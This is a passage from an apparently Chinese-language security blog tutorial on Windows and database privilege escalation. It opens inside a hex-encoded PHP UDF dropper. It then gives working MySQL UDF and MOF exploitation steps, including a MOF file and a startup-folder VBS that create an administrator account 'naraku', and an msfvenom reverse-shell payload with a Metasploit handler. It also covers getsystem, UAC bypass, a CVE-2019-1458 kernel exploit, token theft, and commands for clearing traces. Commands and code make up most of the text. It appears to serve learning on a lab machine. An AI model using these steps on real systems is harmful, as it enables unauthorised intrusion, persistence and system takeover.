0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,CHAR))&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> mysql_error().<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>        mysql_close(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    mysql_query(<span class="hljs-string">&#x27;select c from udftmp into dumpfile &quot;&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> mysql_error(). <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>        mysql_query(<span class="hljs-string">&#x27;drop table udftmp&#x27;</span>);<br>        mysql_close(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    mysql_query(<span class="hljs-string">&#x27;drop table udftmp&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) !=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Dump DLL Failed.&#x27;</span>.mysql_error();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Dump DLL Success!&#x27;</span>;<br>    mysql_close(<span class="hljs-variable">$conn</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<h5 id="UDF手工提权"><a href="#UDF手工提权" class="headerlink" title="UDF手工提权"></a>UDF手工提权</h5><ul>
<li><p>获取UDF：将<code>sqlmap\data\udf\</code>中找到对应系统的<code>dll_</code>文件，复制到<code>sqlmap\extra\cloak\</code>，输入以下命令即可得到</p>
</li>
<li><ul>
<li>SQLMap自带的shell及一些二进制文件，为了防止被误杀都经过异或方式编码，不能直接使用，需要利用SQLMap自带的解码工具<code>cloak.py</code>进行解码</li>
</ul>
</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ python cloak<span class="hljs-selector-class">.py</span> -d -<span class="hljs-selector-tag">i</span> lib_mysqludf_sys.dll_<br></code></pre></td></tr></table></figure>


<ul>
<li><p>寻找目录</p>
</li>
<li><ul>
<li><code>MySQL&lt;5.1</code>，UDF导出到系统目录<code>c:/windows/system32/</code></li>
<li><code>MySQL&gt;5.1</code>，UDF导出到MySQL安装目录<code>lib\plugin\</code>目录(该目录默认不存在，需手动创建)</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 寻找MySQL目录</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br><br><span class="hljs-comment">-- 利用NTFS ADS创建目录,有Webshell的情况下可直接菜刀创建</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION&#x27;</span>; <br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#x27;</span>;<br></code></pre></td></tr></table></figure>


<ul>
<li>导出UDF：直接上传没有权限，可通过MySQL语句写入</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 在【本地】以二进制读取UDF并转换十六进制</span><br>mysql&gt; <span class="hljs-keyword">select</span> hex(load_file(&quot;C:\\udf.dll&quot;)) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\myudf.txt&#x27;</span>;<br><br><span class="hljs-comment">-- 在【靶机】写入UDF,这里将UDF文件命名为myudf.dll</span><br>mysql&gt; <span class="hljs-keyword">select</span> unhex (<span class="hljs-string">&#x27;十六进制UDF&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile &quot;C:\\Program Files\\MySQL\\lib\\plugin\\myudf.dll&quot;;<br><br><span class="hljs-comment">-- 出现secure-file-priv相关报错，需要修改mysql配置文件my.ini或mysql.cnf</span><br><span class="hljs-comment">-- secure_file_priv=/ # 允许导入到任意路径</span><br></code></pre></td></tr></table></figure>


<ul>
<li>利用UDF创建用户自定义函数</li>
</ul>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">mysql&gt; <span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;myudf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>


<ul>
<li>利用函数执行命令</li>
</ul>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">mysql</span>&gt; <span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">sys_eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>)</span><br></code></pre></td></tr></table></figure>


<h4 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h4><h5 id="MOF提权条件"><a href="#MOF提权条件" class="headerlink" title="MOF提权条件"></a>MOF提权条件</h5><ul>
<li>Windows 2003及以下版本</li>
<li>MySQL启动身份具有权限去读写<code>c:/windows/system32/wbem/mof</code>目录</li>
<li><code>secure-file-priv</code>参数不为<code>null</code></li>
</ul>
<h5 id="MOF提权原理"><a href="#MOF提权原理" class="headerlink" title="MOF提权原理"></a>MOF提权原理</h5><blockquote>
<p>MOF文件每五秒就会执行，而且是系统权限，通过MySQL使用<code>load_file</code> 将文件写入<code>/wbme/mof</code>，然后系统每隔五秒就会执行一次上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
</blockquote>
<ul>
<li><code>nullevt.mof</code>的利用代码如下：</li>
</ul>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br>instance of __EventFilter as $EventFilter &#123;<br>  EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>  Name = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>  Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br>  <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br>  <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>  Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br>&#125;;<br>instance of ActiveScriptEventConsumer as $Consumer &#123;<br>  Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>  ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br><span class="hljs-comment"># 执行命令,新建用户naraku</span><br>  ScriptText = <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user naraku 123456 /add\<span class="hljs-string">&quot;)&quot;</span>;<br>&#125;;<br>instance of __FilterToConsumerBinding &#123;<br>  Consumer = $Consumer;<br>  Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure>


<h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul>
<li><p>将上面的脚本上传到有读写权限的目录下，如：<code>C:/xxx/</code></p>
</li>
<li><p>使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
</li>
<li><ul>
<li>这里不能使用<code>outfile</code>，因为会在末端写入新行，而MOF在被当作二进制文件时无法正常执行，所以需要用<code>dumpfile</code>导出一行数据。</li>
</ul>
</li>
</ul>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&quot;C:/xxx/test.mof&quot;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></code></pre></td></tr></table></figure>


<ul>
<li>当我们成功把MOF导出时，mof就会直接被执行，且5秒创建一次用户</li>
</ul>
<h5 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h5><ul>
<li>提权成功后，就算被删号，MOF也会在五秒内将原账号重建，如果要删除入侵账号可以执行以下命令：</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> net stop winmgmt<br><span class="hljs-variable">$</span> <span class="hljs-built_in">del</span> c:/windows/system32/wbem/repository<br><span class="hljs-variable">$</span> net <span class="hljs-built_in">start</span> winmgmt<br></code></pre></td></tr></table></figure>


<ul>
<li>然后重启服务即可</li>
</ul>
<h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><ul>
<li>已知root密码</li>
<li><code>file_priv</code>不为<code>null</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> a (cmd text); <br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a <span class="hljs-keyword">values</span> (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); <br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a <span class="hljs-keyword">values</span> (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user naraku 123456 /add&quot;&quot;,0) &quot; ); <br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a <span class="hljs-keyword">values</span> (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators naraku /add&quot;&quot;,0) &quot; ); <br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> a <span class="hljs-keyword">into</span> outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;<br></code></pre></td></tr></table></figure>


<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><ul>
<li>前提：拿到SA密码</li>
</ul>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ul>
<li><p>传统<code>xp_cmdshell</code>利用</p>
</li>
<li><ul>
<li><code>xp_cmdshell</code>被删如何恢复</li>
</ul>
</li>
<li><p>借助COM组件执行命令</p>
</li>
<li><p>借助CLR执行命令（类似MySQL UDF）</p>
</li>
<li><p>本地Hash注入+端口转发/Socks实现无密码连接目标内网MSSQL</p>
</li>
<li><p>利用Windows访问令牌实现无密码连接目标内网MSSQL</p>
</li>
</ul>
<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><ul>
<li>通常情况下Oracle服务的运行权限都非常高</li>
<li>MSF下各类自动化利用模块</li>
<li>通常情况下，Oracle服务的运行权限都比较高</li>
</ul>
<h3 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h3><ul>
<li>Postgresql下的UDF实现</li>
</ul>
<h2 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h2><ul>
<li><p>注意以下命令执行时的状态</p>
</li>
<li><ul>
<li><code>$</code>：Linux命令行下</li>
<li><code>msf</code>：进入MSF控制台</li>
<li><code>meterpreter</code>：进入某个<code>session</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成木马并放入靶机</span><br>$ msfvenom -p windows/meterpreter_reverse_tcp lhost=&lt;攻击机IP&gt; lport=&lt;攻击机监听端口&gt; -f exe -o /tmp/win.exe<br><span class="hljs-comment"># 攻击机监听</span><br>$ msfconsole<br>msf&gt; use exploit/multi/handler <br>msf&gt; <span class="hljs-built_in">set</span> payload windows/meterpreter_reverse_tcp<br>msf&gt; <span class="hljs-built_in">set</span> lhost &lt;攻击机IP&gt;<br>msf&gt; <span class="hljs-built_in">set</span> lport &lt;攻击机端口&gt;<br>msf&gt; exploit<br><span class="hljs-comment"># 靶机运行,此时攻击机MSF会接收到反弹的Shell,在MSF中运行shell命令</span><br>meterpreter&gt; shell <br>C:\Users\Naraku\Desktop&gt;whoami<br>naraku-win7\naraku<br><span class="hljs-comment"># 出现中文乱码可运行</span><br><span class="hljs-comment"># C:\Users\Naraku\Desktop&gt;chcp 65001</span><br></code></pre></td></tr></table></figure>


<h3 id="GetSystem"><a href="#GetSystem" class="headerlink" title="GetSystem"></a>GetSystem</h3><ul>
<li>直接运行<code>getsystem</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">meterpreter&gt;</span><span class="bash"> getsystem</span><br></code></pre></td></tr></table></figure>


<h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><ul>
<li><p>相关脚本</p>
</li>
<li><ul>
<li><code>use exploit/windows/local/bypassuac</code></li>
<li><code>use exploit/windows/local/bypassuac_injection</code></li>
<li><code>use windows/local/bypassuac_vbs</code></li>
<li><code>use windows/local/ask</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter&gt; background  <span class="hljs-comment"># 后台session </span><br>msf&gt; use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac<br>msf&gt; <span class="hljs-built_in">set</span> SESSION &lt;session_id&gt;  <br><span class="hljs-comment"># 后台session时会返回session_id,如不清楚可以使用命令sessions -l</span><br>msf&gt; run<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235815.jpg" alt="image" data-caption="image" loading="lazy"></p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><ul>
<li>这里查询补丁跟前面<code>systeminfo</code>一样，配合<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">提权辅助平台 - 漏洞编号</a>查询可利用漏洞编号</li>
</ul>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 查询补丁</span><br>meterpreter&gt; run post<span class="hljs-regexp">/windows/g</span>ather/enum_patches <br>[+] KB2999226 installed on <span class="hljs-number">11</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2020</span><br>[+] KB976902 installed on <span class="hljs-number">11</span><span class="hljs-regexp">/21/</span><span class="hljs-number">2010</span><br></code></pre></td></tr></table></figure>


<ul>
<li>也可以使用<code>local_exploit_suggester</code>查询哪些Exp可以利用。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查询Exp</span><br><span class="hljs-meta">msf&gt;</span><span class="bash"> use post/multi/recon/local_exploit_suggester</span> <br><span class="hljs-meta">msf&gt;</span><span class="bash"> <span class="hljs-built_in">set</span> LHOST &lt;攻击机IP&gt;</span><br><span class="hljs-meta">msf&gt;</span><span class="bash"> <span class="hljs-built_in">set</span> SESSION &lt;session_id&gt;</span><br><span class="hljs-meta">msf&gt;</span><span class="bash"> run</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235820.jpg" alt="image" data-caption="image" loading="lazy"></p>
<ul>
<li>这里将上一步查询到的Exp打了一遍发现都没有成功，回头一看发现<strong>原来是系统位数的原因</strong>。这里的<code>Meterpreter</code>运行在32位，而系统位数为64位。</li>
</ul>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235824.jpg" alt="image" data-caption="image" loading="lazy"></p>
<ul>
<li>因此需要做进程迁移，将<code>Meterpreter</code>迁移到一个64位的进程。</li>
</ul>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">meterpreter&gt; sysinfo         <span class="hljs-meta"># 查看位数</span><br>meterpreter&gt; ps              <span class="hljs-meta"># 查看进程</span><br>meterpreter &gt; migrate <span class="hljs-params">&lt;PID&gt;</span>  <span class="hljs-meta"># 进程迁移</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235835.jpg" alt="image" data-caption="image" loading="lazy"></p>
<ul>
<li>重复前面使用<code>local_exploit_suggester</code>那一步，可以看到现在查询的是64位的Exp</li>
</ul>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235839.jpg" alt="image" data-caption="image" loading="lazy"></p>
<ul>
<li>这里选择选个比较新的<code>CVE_2019_1458</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">msf&gt;</span><span class="bash"> use exploit/windows/<span class="hljs-built_in">local</span>/cve_2019_1458_wizardopium</span> <br><span class="hljs-meta">msf&gt;</span><span class="bash"> <span class="hljs-built_in">set</span> SESSION &lt;session_id&gt;</span><br><span class="hljs-meta">msf&gt;</span><span class="bash"> run</span><br><span class="hljs-meta">meterpreter&gt;</span><span class="bash"> getuid</span><br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235843.jpg" alt="image" data-caption="image" loading="lazy"></p>
<h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><ul>
<li><code>incognito</code>假冒令牌</li>
</ul>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs smali">meterpreter&gt; use incognito                                  <br>meterpreter&gt; list_tokens -u                          <span class="hljs-comment"># 查看可用的token</span><br>meterpreter&gt; impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27; <span class="hljs-comment"># 假冒SYSTEM token</span><br>meterpreter&gt;<span class="hljs-built_in"> execute </span>-f cmd.exe -i –t                <span class="hljs-comment"># -t使用假冒的token 执行</span><br>meterpreter&gt; rev2self                               <span class="hljs-comment"># 返回原始token</span><br></code></pre></td></tr></table></figure>


<ul>
<li><code>steal_token</code>窃取令牌</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">meterpreter&gt;</span><span class="bash"> ps                 <span class="hljs-comment"># 查看进程</span></span><br><span class="hljs-meta">meterpreter&gt;</span><span class="bash"> steal_token &lt;PID&gt;  <span class="hljs-comment"># 从指定进程中窃取token</span></span><br><span class="hljs-meta">meterpreter&gt;</span><span class="bash"> drop_token         <span class="hljs-comment"># 删除窃取的token</span></span><br></code></pre></td></tr></table></figure>


<h3 id="SMB系列RCE"><a href="#SMB系列RCE" class="headerlink" title="SMB系列RCE"></a>SMB系列RCE</h3><blockquote>
<p>基本绝迹</p>
</blockquote>
<ul>
<li>MS08-067</li>
<li>MS17-010</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://huntingday.github.io/img/Localprivilege.png">系统提权入门思维导图</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/3ichae1/p/12909952.html">MySQL之UDF提权</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wsnbbz/article/details/104802100">内网渗透之——MySQL数据库提权之——UDF提权</a></li>
<li><a target="_blank" rel="noopener" href="https://gwjczwy.github.io/2020/07/20/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">MySQL提权总结</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2719#toc-14">Windows下三种MySQL提权剖析</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42349134/article/details/100657705">Metasploit的一些提权方法</a></li>
</ul>

    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
</div>

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E6%9D%83%E9%99%90%E5%88%92%E5%88%86%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">提权基础（权限划分）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">基础命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">系统漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">查询补丁信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.</span> <span class="toc-text">提权步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL"><span class="toc-number">3.1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.1.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#UDF%E6%9C%A8%E9%A9%AC%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">UDF木马提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#UDF%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">UDF手工提权</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.2.</span> <span class="toc-text">MOF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">MOF提权条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">MOF提权原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">3.1.2.3.</span> <span class="toc-text">提权步骤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">3.1.2.4.</span> <span class="toc-text">痕迹清除</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.3.</span> <span class="toc-text">启动项提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-number">3.2.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.1.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle"><span class="toc-number">3.3.</span> <span class="toc-text">Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Postgresql"><span class="toc-number">3.4.</span> <span class="toc-text">Postgresql</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">MSF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetSystem"><span class="toc-number">4.1.</span> <span class="toc-text">GetSystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BypassUAC"><span class="toc-number">4.2.</span> <span class="toc-text">BypassUAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">4.3.</span> <span class="toc-text">内核提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5"><span class="toc-number">4.4.</span> <span class="toc-text">令牌操纵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E7%B3%BB%E5%88%97RCE"><span class="toc-number">4.5.</span> <span class="toc-text">SMB系列RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
